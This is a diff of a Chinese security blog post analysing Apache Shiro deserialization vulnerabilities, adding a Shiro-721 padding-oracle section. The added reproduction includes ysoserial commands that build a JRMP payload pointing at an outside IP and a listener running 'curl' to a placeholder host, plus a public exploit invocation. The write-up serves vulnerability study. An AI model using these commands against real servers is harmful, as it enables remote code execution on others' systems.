@@ -115,7 +115,7 @@
 
 
 
-  <meta name="keywords" content="漏洞分析,Java">
+  <meta name="keywords" content="Java,漏洞分析">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Shiro 反序列化漏洞分析">
 <meta property="og:url" content="http://0day.design/2020/03/08/Shiro Padding Oracle Attack 反序列化/index.html">
@@ -128,7 +128,6 @@
 <meta property="og:image" content="https://i.loli.net/2020/03/07/tPgIkSDaCsdwVn1.jpg">
 <meta property="og:image" content="https://i.loli.net/2020/03/07/C4Geb3w2WPHAQXd.jpg">
 <meta property="og:image" content="https://i.loli.net/2020/03/07/7HiNObjseCl94zW.jpg">
-<meta property="og:image" content="https://i.loli.net/2020/03/07/5wy1YWJHXT8V79L.jpg">
 <meta property="og:image" content="https://i.loli.net/2020/03/07/b6fdK82s5WYpvqz.jpg">
 <meta property="og:image" content="https://i.loli.net/2020/03/07/KJtiUeSjDydLH3a.jpg">
 <meta property="og:image" content="https://i.loli.net/2020/03/07/LKbT9AjuN4lIoGn.jpg">
@@ -167,7 +166,16 @@
 <meta property="og:image" content="https://i.loli.net/2020/03/08/tsU1jzcnL76EokT.jpg">
 <meta property="og:image" content="https://i.loli.net/2020/03/08/EiaT4phwcOBbCPt.jpg">
 <meta property="og:image" content="https://i.loli.net/2020/03/08/S9Mjhr28QHYEu1f.jpg">
-<meta property="og:updated_time" content="2020-03-08T11:06:52.942Z">
+<meta property="og:image" content="https://i.loli.net/2020/03/09/poL4qfkhUxnFrBV.jpg">
+<meta property="og:image" content="http://0day.design/2020/03/08/Shiro%20Padding%20Oracle%20Attack%20反序列化/media/15832217572390/15837284569537.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/03/09/uUbnDyr9w74SjYE.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/03/09/Bub7daNSGAPwxe1.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/03/09/wBSoNMXT1W4iRyd.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/03/09/Xouavkr5TKR62gy.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/03/09/qIze16hpPJ9nAYD.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/03/09/eSDFNz5iod7fBPX.jpg">
+<meta property="og:image" content="https://i.loli.net/2020/03/09/PF9fCX7my8A2n3p.jpg">
+<meta property="og:updated_time" content="2020-03-09T08:43:03.365Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Shiro 反序列化漏洞分析">
 <meta name="twitter:image" content="https://i.loli.net/2020/03/07/f5UJsNlhXrZcvn8.jpg">
@@ -479,12 +487,24 @@
                 
               
 
-              <time title="Created: 2020-03-08 19:02:00 / Modified: 19:06:52" itemprop="dateCreated datePublished" datetime="2020-03-08T19:02:00+08:00">2020-03-08</time>
+              <time title="Created: 2020-03-08 19:02:00" itemprop="dateCreated datePublished" datetime="2020-03-08T19:02:00+08:00">2020-03-08</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2020-03-09 16:43:03" itemprop="dateModified" datetime="2020-03-09T16:43:03+08:00">2020-03-09</time>
               
             
           </span>
@@ -559,7 +579,7 @@
 </blockquote>
 <h2 id="Padding-Oracle-Attack"><a href="#Padding-Oracle-Attack" class="headerlink" title="Padding Oracle Attack"></a>Padding Oracle Attack</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ol>
 <li>攻击者知道密文和初始向量IV</li>
-<li>攻击者可以和padding oracle服务器进行交互：客户端向服务器发送密文(包括IV)，服务端(解密时)会告知客户端padding是否正常。</li>
+<li>padding错误和padding正确服务器可返回不一样的状态</li>
 </ol>
 <p><strong>攻击效果</strong><br>正常CBC解密需要知道IV、Key、密文，而通过Padding Oracle漏洞，只用知道IV、密文即可获得明文。</p>
 <h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><p>以这样一个程序为例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sampleapp/home.jsp?UID=0000000000000000EFC2807233F9D7C097116BB33E813C5E</span><br></pre></td></tr></table></figure></p>
@@ -572,8 +592,7 @@
 <p><strong>padding 0x02</strong><br>此时，通过修改IV第八个字节的值使得最后一个padding位变成0x02(上图中0x67^0x02=0×64)，再fuzz IV第七个字节，使得服务端解出plaintext其填充位为0x02，以此类推。</p>
 <p>总的来说，其实攻击的本质都是为了得到中间临时变量intermediary value，通过其和初始IV计算出明文。</p>
 <p><strong>多分组密文情况</strong><br>上面说到的Padding Oracle Attack是以单个分组进行的，如果密文有多个分组，其最大的区别在于这一分组加密的初始IV向量为上次组加密的结果Ciphertext。</p>
-<p>在多分组密文中，通过上述手段得到第n个分组的intermediary value后，我们可以通过控制第n-1个分组的密文来控制第n个分组的明文plaintext，而第n-1个分组的明文可以由第n-2个分组的密文控制，以此类推，达到伪造任意明文的效果。</p>
-<p><img src="https://i.loli.net/2020/03/07/5wy1YWJHXT8V79L.jpg" alt="-w600"></p>
+<p>在多分组密文中，由于密文和IV已知且可控，先拿第一组padding的方式爆破IV推算intermediary value，然后根据原始IV计算出明文，也可以通过修改原始IV控制密文结果；再拿第一二组，用padding的方式爆破intermediary value，此时的初始IV为第一组的密文，以此类推。</p>
 <h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><p>漏洞的关键点在于攻击者能够判断其padding的结果，在使用CBC模式的分组加密算法需要注意这一点，比如让服务端加上异常处理等等。</p>
 <blockquote>
 <p>实验代码：<a href="media/15832217572390/Demo.py">Demo</a></p>
@@ -618,14 +637,30 @@
 <h3 id="挖掘3-2-1无数组gadget"><a href="#挖掘3-2-1无数组gadget" class="headerlink" title="挖掘3.2.1无数组gadget"></a>挖掘3.2.1无数组gadget</h3><blockquote>
 <p>先挖坑，挖到再说吧</p>
 </blockquote>
-<h2 id="shiro-Padding-Oracle攻击（Shiro-lt-1-4-1）"><a href="#shiro-Padding-Oracle攻击（Shiro-lt-1-4-1）" class="headerlink" title="shiro Padding Oracle攻击（Shiro &lt;= 1.4.1）"></a>shiro Padding Oracle攻击（Shiro &lt;= 1.4.1）</h2><p>根据上文所述的Padding Oracle攻击的条件，这里分析一下shiro中对padding的处理：</p>
-<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>这段时间从密码学到shiro反序列化的几个版本漏洞分析，接下来要研究一下shiro反序列化RCE的回显问题。</p>
+<h2 id="Shiro-Padding-Oracle攻击（Shiro-lt-1-4-1）"><a href="#Shiro-Padding-Oracle攻击（Shiro-lt-1-4-1）" class="headerlink" title="Shiro Padding Oracle攻击（Shiro &lt;= 1.4.1）"></a>Shiro Padding Oracle攻击（Shiro &lt;= 1.4.1）</h2><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>EXP用<a href="https://github.com/3ndz/Shiro-721" target="_blank" rel="noopener">3ndz/Shiro-721</a>，shiro的版本1.4.1配置过程参考上文。</p>
+<p>yso生成个jrmpclient：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar JRMPClient &apos;47.93.226.148:12345&apos; &gt; JRMPClient</span><br></pre></td></tr></table></figure></p>
+<p>服务端起一个jrmplistener<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections2 &apos;curl http://x.x.x.x:8989&apos;</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 shiro_padding_oracle.py http://127.0.0.1:8088/samples_web_war_exploded/index.jsp [rememberMe的cookie] JRMPClien</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2020/03/09/poL4qfkhUxnFrBV.jpg" alt="-w1479"></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>先来看看这个版本对秘钥的处理：org/apache/shiro/mgt/AbstractRememberMeManager.java<br><img src="/2020/03/08/Shiro Padding Oracle Attack 反序列化/media/15832217572390/15837284569537.jpg" alt="-w1055"><br>一直跟进，可以看到将之前的硬编码秘钥换成了动态生成：<br><img src="https://i.loli.net/2020/03/09/uUbnDyr9w74SjYE.jpg" alt="-w878"></p>
+<h4 id="padding错误"><a href="#padding错误" class="headerlink" title="padding错误"></a>padding错误</h4><p>在我们给rememberMe输入错误的padding后，经过上文提到的解密过程后，会抛出异常:/org/apache/shiro/crypto/JcaCipherService.class<br><img src="https://i.loli.net/2020/03/09/Bub7daNSGAPwxe1.jpg" alt="-w1309"><br>然后在org/apache/shiro/mgt/AbstractRememberMeManager.java#getRememberedPrincipals捕获<br><img src="https://i.loli.net/2020/03/09/wBSoNMXT1W4iRyd.jpg" alt="-w1341"></p>
+<p>最后在org/apache/shiro/web/servlet/SimpleCookie.java中给返回包设置一个rememberMe的cookie，覆盖掉之前的值：<br><img src="https://i.loli.net/2020/03/09/Xouavkr5TKR62gy.jpg" alt="-w1179"></p>
+<p>调用栈：<br><img src="https://i.loli.net/2020/03/09/qIze16hpPJ9nAYD.jpg" alt="-w594"></p>
+<h4 id="padding正确，反序列化错误"><a href="#padding正确，反序列化错误" class="headerlink" title="padding正确，反序列化错误"></a>padding正确，反序列化错误</h4><p>在之前的padding oracle漏洞中，依靠控制前一块密文来伪造后一块的明文，根据Padding的机制，可构造出一个bool条件，从而逐位得到明文，然后逐块得到所有明文。</p>
+<p>也就是说通过padding获取来伪造明文的，会改变前一块的密文，也就是会影响到解密的结果。我们来看shiro中对于解密结果的处理，在DefaultSerializer.class中进行反序列化时，会失败而抛出异常：<br><img src="https://i.loli.net/2020/03/09/eSDFNz5iod7fBPX.jpg" alt="-w1316"><br>而对于客户端而言，结果是一样的，都走到了AbstractRememberMeManager.java的异常处理：<br><img src="https://i.loli.net/2020/03/09/PF9fCX7my8A2n3p.jpg" alt="-w1187"><br>接着就是给客户端重置rememberMe的cookie。</p>
+<h4 id="拼接序列化数据"><a href="#拼接序列化数据" class="headerlink" title="拼接序列化数据"></a>拼接序列化数据</h4><p>在<a href="https://xz.aliyun.com/t/3847" target="_blank" rel="noopener">gyyy:浅析Java序列化和反序列化</a>这篇文章中介绍了java序列化和反序列化的机制，关键点在于ObjectOutputStream是一个Stream，他会按格式以队列方式读下去，后面拼接无关内容，不会影响反序列化。</p>
+<p>所以现在BOOL条件就出来了，拼接无关数据，padding 正确，能正常反序列化，padding错误抛出异常。</p>
+<p>最后payload的构造就是不断的用两个block去padding得到intermediary之后，构造密文使得解密后得到指定明文，最后拼接到原有的cookie上。</p>
+<p>exp: <a href="https://github.com/3ndz/Shiro-721" target="_blank" rel="noopener">https://github.com/3ndz/Shiro-721</a></p>
+<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>这段时间从密码学到shiro反序列化的几个版本漏洞分析，算法功底还得加强，接下来的时间研究一下shiro反序列化RCE的回显问题。</p>
 <p>参考文章：</p>
 <ul>
 <li><a href="https://saucer-man.com/information_security/396.html" target="_blank" rel="noopener">分析调试apache shiro反序列化漏洞(CVE-2016-4437)</a>                                                    </li>
 <li><a href="https://paper.seebug.org/shiro-rememberme-1-2-4/" target="_blank" rel="noopener">【漏洞分析】Shiro RememberMe 1.2.4 反序列化导致的命令执行漏洞</a></li>
 <li><a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html" target="_blank" rel="noopener">pwn-ctf-platform-with-java-jrmp-gadget</a>    </li>
-<li><a href="https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html" target="_blank" rel="noopener">Exploiting JVM deserialization vulns despite a broken class loader</a>     </li>
+<li><a href="https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html" target="_blank" rel="noopener">Exploiting JVM deserialization vulns despite a broken class loader</a>    </li>
+<li><a href="https://www.anquanke.com/post/id/193165" target="_blank" rel="noopener">Shiro 721 Padding Oracle攻击漏洞分析</a></li>
+<li><a href="https://p0sec.net/index.php/archives/126/" target="_blank" rel="noopener">p0:Shiro Padding Oracle Attack 反序列化</a></li>
 </ul>
 
       
@@ -662,9 +697,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/漏洞分析/" rel="tag"><i class="fa fa-tag"></i> 漏洞分析</a>
-          
             <a href="/tags/Java/" rel="tag"><i class="fa fa-tag"></i> Java</a>
+          
+            <a href="/tags/漏洞分析/" rel="tag"><i class="fa fa-tag"></i> 漏洞分析</a>
           
         </div>
       
@@ -925,7 +960,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#基础"><span class="nav-number">1.</span> <span class="nav-text">基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Padding-Oracle-Attack"><span class="nav-number">2.</span> <span class="nav-text">Padding Oracle Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用条件"><span class="nav-number">2.1.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#demo"><span class="nav-number">2.2.</span> <span class="nav-text">demo</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防御"><span class="nav-number">2.3.</span> <span class="nav-text">防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CBC字节反转"><span class="nav-number">3.</span> <span class="nav-text">CBC字节反转</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2016-4437-Shiro-反序列化-Shiro-lt-1-2-4"><span class="nav-number">4.</span> <span class="nav-text">CVE-2016-4437: Shiro 反序列化(Shiro &lt;= 1.2.4)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#环境搭建"><span class="nav-number">4.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞复现"><span class="nav-number">4.2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#代码分析"><span class="nav-number">4.3.</span> <span class="nav-text">代码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#加密"><span class="nav-number">4.3.1.</span> <span class="nav-text">加密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解密"><span class="nav-number">4.3.2.</span> <span class="nav-text">解密</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#坑点：反序列化限制"><span class="nav-number">4.4.</span> <span class="nav-text">坑点：反序列化限制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#JRMP绕过"><span class="nav-number">4.4.1.</span> <span class="nav-text">JRMP绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#挖掘3-2-1无数组gadget"><span class="nav-number">4.5.</span> <span class="nav-text">挖掘3.2.1无数组gadget</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shiro-Padding-Oracle攻击（Shiro-lt-1-4-1）"><span class="nav-number">5.</span> <span class="nav-text">shiro Padding Oracle攻击（Shiro &lt;= 1.4.1）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#最后"><span class="nav-number">6.</span> <span class="nav-text">最后</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#基础"><span class="nav-number">1.</span> <span class="nav-text">基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Padding-Oracle-Attack"><span class="nav-number">2.</span> <span class="nav-text">Padding Oracle Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用条件"><span class="nav-number">2.1.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#demo"><span class="nav-number">2.2.</span> <span class="nav-text">demo</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防御"><span class="nav-number">2.3.</span> <span class="nav-text">防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CBC字节反转"><span class="nav-number">3.</span> <span class="nav-text">CBC字节反转</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CVE-2016-4437-Shiro-反序列化-Shiro-lt-1-2-4"><span class="nav-number">4.</span> <span class="nav-text">CVE-2016-4437: Shiro 反序列化(Shiro &lt;= 1.2.4)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#环境搭建"><span class="nav-number">4.1.</span> <span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞复现"><span class="nav-number">4.2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#代码分析"><span class="nav-number">4.3.</span> <span class="nav-text">代码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#加密"><span class="nav-number">4.3.1.</span> <span class="nav-text">加密</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#解密"><span class="nav-number">4.3.2.</span> <span class="nav-text">解密</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#坑点：反序列化限制"><span class="nav-number">4.4.</span> <span class="nav-text">坑点：反序列化限制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#JRMP绕过"><span class="nav-number">4.4.1.</span> <span class="nav-text">JRMP绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#挖掘3-2-1无数组gadget"><span class="nav-number">4.5.</span> <span class="nav-text">挖掘3.2.1无数组gadget</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shiro-Padding-Oracle攻击（Shiro-lt-1-4-1）"><span class="nav-number">5.</span> <span class="nav-text">Shiro Padding Oracle攻击（Shiro &lt;= 1.4.1）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞复现-1"><span class="nav-number">5.1.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞分析"><span class="nav-number">5.2.</span> <span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#padding错误"><span class="nav-number">5.2.1.</span> <span class="nav-text">padding错误</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#padding正确，反序列化错误"><span class="nav-number">5.2.2.</span> <span class="nav-text">padding正确，反序列化错误</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#拼接序列化数据"><span class="nav-number">5.2.3.</span> <span class="nav-text">拼接序列化数据</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#最后"><span class="nav-number">6.</span> <span class="nav-text">最后</span></a></li></ol></div>
             
 
           </div>
@@ -967,7 +1002,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共82.4k字</span>
+  <span class="post-count">博客全站共82.9k字</span>
 </div>
 
 <span id="busuanzi_container_site_pv" class="theme-info">
